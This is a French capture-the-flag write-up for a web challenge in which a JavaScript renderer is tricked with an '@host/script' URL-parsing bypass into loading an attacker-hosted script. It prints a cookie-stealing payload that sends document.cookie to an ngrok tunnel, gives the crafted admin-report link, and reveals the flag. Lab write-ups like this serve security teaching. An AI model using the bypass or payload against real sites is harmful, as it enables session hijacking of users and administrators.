# Renderer 1 🔍
```
200 pts
```

## Description
```
[FR]
xss me, hacker et récupère les cookies de l'admin.

[EN]
xss me, hacker and stole admin cookie.

Author: 5c0r7

http://ctf.hackerlab.bj:1024
```

> Ce challenge nous dirige vers une application web web remote renderer JS.
<image src="File/js1.png">
  
> Cette application dispose d'un outil qui permet d'interpréter un script JS lorsque le chemin du fichier est fourni.

> Nous avons décidé d'envoyer un simple lien https://google.com pour observer le comportement de l'outil. La réponse obtenue est : `Admin is unable😫 to read your remote JS file: https://hackerlab.bjhttps://google.com.js`

<image src="File/js2.png">
  
> L'outil préfixe notre chemin avec `https://hackerlab.bj` puis ajoute l'extension `js`.

> Dans la section *Report* de l'application, nous avons la possibilité d'envoyer un lien à l'admin, à condition qu'il respecte la politique de même origine *same origin* et ait le même schéma d'url que l'application. ```The link you have submitted doesn't have the same origin and scheme with my application🤨. Ex: http://54.37.70.250```
  
> Notre objectif maintenant est de parvenir à charger notre script JS dans l'outil de rendu, puis d'envoyer le lien ainsi formé à l'admin, car il respecte la politique de même origine et le schéma URL de l'application. ```http://54.37.70.250:1024/renderer.php?url=https%3A%2F%2Fgoogle.com```

<image src="File/js3.png">

> Après quelques recherches, nous avons découvert un article sur le Bypass de Format URL. Cet article présentait des moyens intéressants de réaliser des redirections vers des domaines que nous controlions.[Source](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#domain-confusion)

> Nous avons donc decidé d'envoyer comme payload ```@attacker.com/script```

<image src="File/js4.png">
  
> Bingo ! L'outil tente d'interpréter le fichier *script.js* du site *attacker.com*.

> Nous allons utiliser *ngrok* pour créer un tunnel depuis internet vers notre serveur web local.

<image src="File/js5.png">
  
> Nous allons maintenant créer un serveur HTTP en local et y placer un fichier *script.js* contenant notre charge utile ```document.location="http://4b4f-41-138-89-232.ngrok-free.app/?c="+document.cookie;``` pour voler les cookies de l'admin.

<image src="File/js6.png">
  
> Nous allons envoyer à l'outil le chemin ```@4b4f-41-138-89-232.ngrok-free.app/script```. Puis copier le lien qu'il génère.

<image src="File/js7.png">
  
> Nous pouvons maintenant envoyer ce lien ```http://54.37.70.250:1024/renderer.php?url=%404b4f-41-138-89-232.ngrok-free.app%2F```script à l'admin via *Report*.

<image src="File/js8.png">
  
> Une fois le lien envoyé à l'admin, nous pouvons vérifier notre serveur pour voir les cookies de l'admin, qui ne sont rien d'autre que le flag.

<image src="File/js9.png">
  
# Flag

```CTF_UR1_P@rS!ng_C0nfUs!On_3xpl017_hehehe``` 😎
